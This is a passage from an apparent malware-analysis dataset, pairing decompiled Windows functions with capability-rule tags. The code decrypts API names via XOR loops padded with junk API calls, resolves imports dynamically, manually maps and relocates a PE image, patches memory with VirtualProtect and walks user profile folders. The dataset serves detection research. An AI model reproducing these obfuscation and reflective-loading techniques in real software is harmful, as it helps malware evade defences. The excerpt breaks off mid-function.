        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040f4a9(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0x2723235b;\n    var_20h = 0x2b331b59;\n    var_1ch._0_2_ = 0x3527;\n    var_18h = 0x4b475735;\n    var_14h._0_1_ = 0x35;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 5;\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar3 != 0xf36b49) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_3ch = 0x1c21423e;\n    var_38h = 0x2c423f3b;\n    var_34h = 0x621f3a26;\n    var_30h = 0x1f201622;\n    var_2ch = 0x20203f73;\n    var_28h._0_2_ = 0x361e;\n    var_18h = 0x524d366c;\n    var_14h._0_1_ = 0x4f;\n    uVar1 = (*pcVar5)(8, 0x17);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_3ch - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetInputState)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0xb9f717) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_3ch - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x16);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    uVar1 = (*pcVar5)(var_10h);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 883
    },
    "0040f5d9": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040f5d9(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0x2723235b;\n    var_20h = 0x2b331b59;\n    var_1ch._0_2_ = 0x3527;\n    var_18h = 0x4b475735;\n    var_14h._0_1_ = 0x35;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 5;\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar3 != 0xf36b49) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_24h = 0x652a3e16;\n    var_20h = 0x292e2a18;\n    var_1ch._0_2_ = 0x795a;\n    var_18h = 0x37464a44;\n    var_14h._0_1_ = 0x79;\n    uVar1 = (*pcVar5)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0xf3befc) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_24h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    uVar1 = (*pcVar5)(var_10h);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 795
    },
    "0040f6f4": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040f6f4(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint in_EDX;\n    int32_t iVar7;\n    uint *puVar8;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_14h = 0;\n    puVar8 = &var_30h;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_44h = 0x904020a;\n    var_40h = 0x132d1c20;\n    var_3ch = 0x1936273e;\n    var_38h = 0x13d1521;\n    var_34h._0_2_ = 0x243f;\n    var_34h._2_1_ = 0x44;\n    var_24h = 0x68497644;\n    var_20h._0_2_ = 0x4a50;\n    var_18h = in_EDX;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_ch = &var_44h - iVar6;\n    var_10h = iVar6;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar2 != 0xee6de7) {\n            var_8h = 6;\n            *(iVar7 + iVar6) = *(&var_24h + iVar7 % 6) ^ (iVar7 + iVar6)[var_ch];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x13);\n    var_28h = 0x2723235b;\n    var_24h = 0x2b331b59;\n    var_20h._0_2_ = 0x3527;\n    var_8h = 0x4b475735;\n    var_4h._0_1_ = 0x35;\n    uVar1 = (*pcVar4)(8, 0xb);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_ch = &var_28h - iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        iVar2 = var_10h;\n        if (iVar3 != 0xf36b49) {\n            var_ch = 5;\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % 5) ^ (iVar7 + iVar6)[&var_28h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar6, var_10h);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    (*pcVar4)(var_1ch, var_18h, arg_8h, 0, 0, &var_30h, &var_14h, 2, 0, 0x40);\n    uVar1 = fcn.0040f4a9();\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    (*pcVar4)(uVar5);\n    return uVar1;\n}\n",
        "token_count": 1037
    },
    "0040f859": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040f859(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t lpLibFileName;\n    int32_t var_4h;\n    \n    var_20h = 0x2723235b;\n    var_1ch = 0x2b331b59;\n    var_18h._0_2_ = 0x3527;\n    var_14h = 0x4b475735;\n    var_10h._0_2_ = CONCAT11(var_10h._1_1_, 0x35);\n    var_ch = param_2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    lpLibFileName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar3 != 0xf36b49) {\n            var_4h = 5;\n            *(iVar7 + iVar2) = *(&var_14h + iVar7 % 5) ^ (iVar7 + iVar2)[&var_20h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_38h = 0x3c042d16;\n    var_34h = 0xf281903;\n    var_30h = 0x37193738;\n    var_2ch = 0x31340a3e;\n    var_28h = 0x3737111a;\n    var_24h._0_1_ = 0x51;\n    var_14h = 0x52515958;\n    var_10h._0_2_ = 0x786e;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_4h = &var_38h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0xa3d1e7) {\n            var_4h = 6;\n            *(iVar7 + iVar2) = *(&var_14h + iVar7 % 6) ^ (iVar7 + iVar2)[&var_38h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x15);\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    (*pcVar5)(0xffffffff, var_ch);\n    uVar1 = fcn.0040f4a9();\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 893
    },
    "0040f995": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040f995(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint *in_EDX;\n    int32_t iVar6;\n    uint *puVar7;\n    uchar *puVar8;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint *var_18h;\n    int32_t lpModuleName;\n    int32_t var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    \n    var_8h = 0;\n    var_ch = NULL;\n    var_38h = 0x2723235b;\n    puVar7 = &var_54h;\n    var_18h = in_EDX;\n    for (iVar5 = 0x18; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_34h = 0x2b331b59;\n    puVar7 = &var_2ch;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &var_24h;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_30h = CONCAT22(var_30h._2_2_, 0x3527);\n    var_24h = 0x4b475735;\n    var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x35);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    lpModuleName = iVar5;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar3 != 0xf36b49) {\n            var_10h = 5;\n            *(iVar6 + iVar5) = *(&var_24h + iVar6 % 5) ^ (iVar6 + iVar5)[&var_38h - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 10);\n    var_3ch = 0x1a004027;\n    var_38h = 0x511d2b34;\n    var_34h = 0x3e320d10;\n    var_30h = 0x682d5b00;\n    var_24h = 0x68433469;\n    var_20h._0_2_ = 0x4a51;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_10h = &var_3ch - iVar5;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar3 != 0x1ff60d) {\n            var_10h = 6;\n            *(iVar6 + iVar5) = *(&var_24h + iVar6 % 6) ^ (iVar6 + iVar5)[&var_3ch - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar5);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    var_54h = 0x18;\n    var_50h = 0;\n    var_4ch = 0;\n    var_44h = 0;\n    var_40h = 0;\n    var_48h = 0x40;\n    iVar6 = (*pcVar4)(&var_8h, 0xf001f, &var_54h, &var_2ch, 0x40, 0x8000000, 0);\n    if (iVar6 < 0) {\n        iVar6 = fcn.0040f4a9();\n    }\n    else {\n        iVar6 = fcn.0040f6f4(&var_ch);\n        puVar8 = var_ch;\n        var_10h = iVar6;\n        if (iVar6 == 0) {\n            for (; var_2ch != 0; var_2ch = var_2ch + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            *var_18h = var_ch;\n            if (arg_8h != NULL) {\n                *arg_8h = var_8h;\n            }\n        }\n    }\n    if ((var_8h != 0) && (arg_8h == NULL)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_8h);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, lpModuleName);\n    (*pcVar4)(uVar2);\n    return iVar6;\n}\n",
        "token_count": 1396
    },
    "0040fb77": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040fb77(uchar *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uchar *in_ECX;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t *piVar11;\n    uchar *in_EDX;\n    int32_t *piVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    uint32_t uVar15;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EDX + 0x3c);\n    uVar2 = *(in_EDX + iVar3 + 0x14);\n    iVar7 = *(in_EDX + iVar3 + 0x3c);\n    uVar6 = *(in_EDX + iVar3 + 6);\n    puVar13 = in_EDX;\n    puVar14 = in_ECX;\n    for (iVar9 = *(in_EDX + iVar3 + 0x54); iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar14 = *puVar13;\n        puVar13 = puVar13 + 1;\n        puVar14 = puVar14 + 1;\n    }\n    if (uVar6 != 0) {\n        piVar12 = in_EDX + uVar2 + 0x2c + iVar3;\n        do {\n            uVar10 = iVar7 + -1 + piVar12[-1] & ~(iVar7 - 1U);\n            if (uVar10 != 0) {\n                puVar13 = in_EDX + *piVar12;\n                puVar14 = in_ECX + piVar12[-2];\n                for (; uVar10 != 0; uVar10 = uVar10 - 1) {\n                    *puVar14 = *puVar13;\n                    puVar13 = puVar13 + 1;\n                    puVar14 = puVar14 + 1;\n                }\n            }\n            piVar12 = piVar12 + 10;\n            uVar6 = uVar6 - 1;\n        } while (uVar6 != 0);\n    }\n    puVar13 = in_ECX;\n    if (arg_8h != NULL) {\n        puVar13 = arg_8h;\n    }\n    iVar7 = 0xa0;\n    if (*(in_EDX + iVar3 + 4) == -0x799c) {\n        iVar7 = 0xb0;\n    }\n    if ((*(in_EDX + iVar7 + iVar3) != 0) && (uVar6 = *(in_EDX + iVar7 + 4 + iVar3),  uVar6 != 0)) {\n        if (*(in_EDX + iVar3 + 4) == -0x799c) {\n            iVar9 = *(in_EDX + iVar3 + 0x30);\n        }\n        else {\n            iVar9 = *(in_EDX + iVar3 + 0x34);\n        }\n        puVar14 = *(in_EDX + iVar3 + 0x30);\n        uVar10 = puVar13 - *(in_EDX + iVar3 + 0x30);\n        iVar4 = *(in_EDX + iVar3 + 0x34);\n        piVar12 = in_ECX + *(in_EDX + iVar7 + iVar3);\n        for (; 8 < uVar6; uVar6 = uVar6 - *piVar11) {\n            iVar3 = *piVar12;\n            uVar15 = piVar12[1] - 8U >> 1;\n            if ((piVar12[1] <= uVar6) && (uVar15 != 0)) {\n                piVar11 = piVar12 + 2;\n                do {\n                    uVar2 = *piVar11;\n                    if (uVar2 >> 0xc == 3) {\n                        *(in_ECX + (uVar2 & 0xfff) + iVar3) = puVar13 + (*(in_ECX + (uVar2 & 0xfff) + iVar3) - iVar9);\n                    }\n                    else if (uVar2 >> 0xc == 10) {\n                        uVar8 = uVar2 & 0xfff;\n                        puVar1 = in_ECX + uVar8 + iVar3;\n                        uVar5 = *puVar1;\n                        *puVar1 = *puVar1 + uVar10;\n                        *(in_ECX + uVar8 + 4 + iVar3) =\n                             *(in_ECX + uVar8 + 4 + iVar3) + (((puVar13 >> 0x1f) - iVar4) - (puVar13 < puVar14)) +\n                             CARRY4(uVar5, uVar10);\n                    }\n                    piVar11 = piVar11 + 2;\n                    uVar15 = uVar15 - 1;\n                } while (uVar15 != 0);\n            }\n            piVar11 = piVar12 + 1;\n            piVar12 = piVar12 + piVar12[1];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1190
    },
    "004019c7": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004019c7(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_28h;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint lpflOldProtect;\n    \n    var_28h._0_1_ = 0;\n    lpflOldProtect = 0;\n    puVar3 = &var_28h + 1;\n    for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_8h = 0;\n    var_ch = 0;\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    *0x41cd9c = fcn.00404521();\n    iVar2 = fcn.0040be1a();\n    if (iVar2 == 0) {\n        fcn.0040c055();\n        fcn.0040a98b();\n    }\n    while (iVar2 = fcn.0040b6b4(),  iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.0040e6ed();\n    iVar2 = fcn.004041e5();\n    if (iVar2 != 0) {\n        if (2 < var_28h._1_1_) {\n            iVar2 = 0;\n            if (0 < var_28h._1_1_ - 2) {\n                do {\n                    *0x41cd20 = *0x41cd20 + (&var_1ch)[iVar2];\n                    iVar2 = iVar2 + 1;\n                } while (iVar2 < var_28h._1_1_ - 2);\n            }\n        }\n        *0x41cd20 = *0x41cd20 ^ 0x43103655;\n        fcn.0040bf00();\n    }\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(str.QT_Y___, 0x184, 0x40, &lpflOldProtect);\n    fcn.0040474a();\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(str.QT_Y___, 0x184, lpflOldProtect, &lpflOldProtect);\n    fcn.0040fcd2();\n    fcn.0040fcd2();\n    (*_sym.imp.KERNEL32.dll_GlobalAddAtomW)(*0x41cd24);\n    (*_sym.imp.KERNEL32.dll_AddAtomW)(*0x41cd24);\n    iVar2 = fcn.0040d9f1(&var_ch);\n    if (iVar2 == 0) {\n        fcn.0040e684();\n        fcn.004016a9();\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 713
    },
    "00401e16": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401e16(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint lpFindFileData;\n    uint psz1;\n    int32_t var_78h;\n    int32_t var_74h;\n    int32_t var_70h;\n    int32_t var_6ch;\n    uint lpcchSize;\n    int32_t var_64h;\n    uint ARG_0;\n    int32_t var_5ch;\n    int32_t var_58h;\n    uint32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint lpFileName;\n    uint lpProfileDir;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpProfileDir = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    uVar2 = (*pcVar1)(8, 0x208);\n    lpFileName = (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(8, 0x208);\n    ARG_0 = (*pcVar5)(uVar2);\n    lpcchSize = 0x104;\n    var_28h = 0x3123537d;\n    var_24h._0_2_ = 0x770a;\n    var_24h._2_1_ = 0x50;\n    var_24h._3_1_ = 0x53;\n    var_20h._0_2_ = 0x3120;\n    var_20h._2_1_ = 0x49;\n    stack0xffffffdf = 0x29536277;\n    stack0xffffffe3 = 0x45771d31;\n    stack0xffffffe7 = 0x7312553;\n    stack0xffffffeb = 0x3f535677;\n    stack0xffffffef = 0x65773531;\n    var_ch._3_1_ = 0x53;\n    var_8h._0_2_ = 0x3129;\n    var_8h._2_1_ = 4;\n    var_8h._3_1_ = 0x77;\n    var_4h._0_1_ = 0x41;\n    var_4h._1_1_ = 0x53;\n    var_4h._2_1_ = 0x4c;\n    var_4h._3_1_ = 0x31;\n    var_30h = 0x314c5331;\n    var_2ch._0_2_ = 0x7769;\n    uVar2 = (*pcVar1)(8, 0x51);\n    iVar3 = (*pcVar5)(uVar2);\n    var_48h = 6;\n    iVar6 = 0;\n    var_64h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar4 != 0x1f55ab) {\n            *(iVar6 + iVar3) = *(&var_30h + iVar6 % var_48h) ^ (iVar6 + iVar3)[&var_28h - iVar3];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x28);\n    var_28h = 0x4b254b00;\n    var_24h._0_2_ = 0x3334;\n    var_6ch = 5;\n    var_24h._2_1_ = 5;\n    var_24h._3_1_ = 0x4b;\n    var_20h._0_2_ = 0x4b34;\n    var_20h._2_1_ = 0x30;\n    stack0xffffffdf = 0x94b2033;\n    stack0xffffffe3 = 0x2e33084b;\n    stack0xffffffe7 = 0x254b364b;\n    stack0xffffffeb = 0x94b2d33;\n    stack0xffffffef = 0x2433104b;\n    var_ch._3_1_ = 0x4b;\n    var_8h._0_2_ = 0x4b38;\n    var_8h._2_1_ = 0x34;\n    var_8h._3_1_ = 0x33;\n    var_4h._0_1_ = 0x41;\n    var_4h._1_1_ = 0x4b;\n    var_30h = 0x4b554b41;\n    var_2ch._0_2_ = 0x3344;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n    var_78h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = 0;\n    var_70h = var_78h;\n    var_3ch = &var_28h - var_78h;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uVar2 = lpProfileDir;\n        if (iVar6 != 0x11748) {\n            *(iVar3 + var_78h) = *(&var_30h + iVar3 % var_48h) ^ (iVar3 + var_78h)[&var_28h - var_78h];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x26);\n    var_74h = var_64h;\n    iVar3 = (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(lpProfileDir, &lpcchSize);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar3 != 0) {\n        (*_sym.imp.USER32.dll_wsprintfW)(lpFileName, L\"%s\\\\*\", uVar2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n        var_3ch = iVar3;\n        while (iVar3 != -1) {\n            iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x4104e4);\n            if ((iVar6 != 0) && (iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x4104e8),  iVar6 != 0)) {\n                var_54h = 0;\n                var_50h = 0x6e47493e;\n                var_4ch._0_2_ = 0x6870;\n                var_38h = 0x6e6d4962;\n                var_34h._0_2_ = 0x6870;\n                var_30h = 0x35307732;\n                var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x76);\n                do {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(lpFileName, uVar2);\n                    uVar2 = (*pcVar5)(8, 0xd);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar6 = 0;\n                    var_5ch = iVar3;\n                    var_58h = &var_50h - iVar3;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n                        if (iVar4 != 0x9ca36) {\n                            *(iVar6 + iVar3) = *(&var_38h + iVar6 % var_48h) ^ (iVar6 + iVar3)[&var_50h - iVar3];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 6);\n                    (*_sym.imp.SHLWAPI.dll_StrCatW)(lpFileName, iVar3);\n                    stack0xffffffe7 = stack0xffffffe7 & 0xff | 0x43771700;\n                    stack0xffffffeb = 0x52322a35;\n                    stack0xffffffef = 0x6e764630;\n                    var_ch._3_1_ = 0x77;\n                    var_8h._0_2_ = 0x3515;\n                    var_8h._2_1_ = 5;\n                    var_8h._3_1_ = 0x32;\n                    var_4h._0_1_ = 0x77;\n                    var_4h._1_1_ = 0x30;\n                    uVar2 